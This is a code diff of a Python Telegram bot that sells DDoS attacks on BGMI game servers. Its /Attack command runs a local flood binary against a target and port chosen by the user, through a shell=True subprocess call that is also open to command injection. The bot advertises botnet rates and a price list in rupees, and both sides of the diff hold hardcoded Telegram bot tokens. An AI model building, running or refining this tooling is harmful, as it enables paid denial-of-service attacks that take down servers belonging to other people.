@@ -1,18 +1,14 @@
-#
-ddoserpython
+#bgmiddoserpython
 
 import telebot
 import subprocess
 import datetime
 import os
-
-from keep_alive import keep_alive
-keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7657296074:AAEhkt6cikaQl8p5OjIfH788W3ub_SMTUSY')
+bot = telebot.TeleBot('7518472795:AAG3wRMMycog5q2Rlz3zdeMakjVjds6PhYE')
 
 # Admin user IDs
-admin_id = {"2057365092"}
+admin_id = {"5714534758"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -200,7 +196,7 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-# Function to handle the reply when free users run the /bgmi command
+# Function to handle the reply when free users run the /Attack command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
@@ -208,42 +204,42 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
-# Dictionary to store the last time each user ran the /bgmi command
-bgmi_cooldown = {}
+# Dictionary to store the last time each user ran the /Attack command
+Attack_cooldown = {}
 
 COOLDOWN_TIME =0
 
-# Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
+# Handler for /Attack command
+@bot.message_handler(commands=['Attack'])
+def handle_Attack(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
+            if user_id in Attack_cooldown and (datetime.datetime.now() - Attack_cooldown[user_id]).seconds < 3:
+                response = "You Are On Cooldown . Please Wait 5s Before Running The /Attack Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
+            Attack_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
         if len(command) == 4:  # Updated to accept target, time, and port
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 240:
-                response = "Error: Time interval must be less than 240."
+            if time > 300:
+                response = "Error: Time interval must be less than 301."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/Attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time}  1300"
+                full_command = f"./bgmi {target} {port} {time} 1300"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /Attack <target> <port> <time>"  # Updated command syntax
     else:
         response = " You Are Not Authorized To Use This Command ."
 
@@ -251,7 +247,7 @@ def handle_bgmi(message):
 
 
 
-# Add /mylogs command to display logs recorded for bgmi and website commands
+# Add /mylogs command to display logs recorded for Attack and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -275,7 +271,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
+💥 /Attack : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
@@ -297,7 +293,8 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.Dm: @Iconic_Bhai🤖Try To Run This Command : /help 
+    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.Dm: @Iconic_Bhai
+🤖Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
 
@@ -317,15 +314,16 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 240(S)
+-> Attack Time : 180 (S)
 > After Attack Limit : 5 Min
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
-Day-->80 Rs
-Week-->300 Rs
-Month-->800 Rs
-Dm: @Iconic_Bhai'''
+Day-->100 Rs
+Week-->400 Rs
+Month-->1000 Rs
+Dm: @Iconic_Bhai
+'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
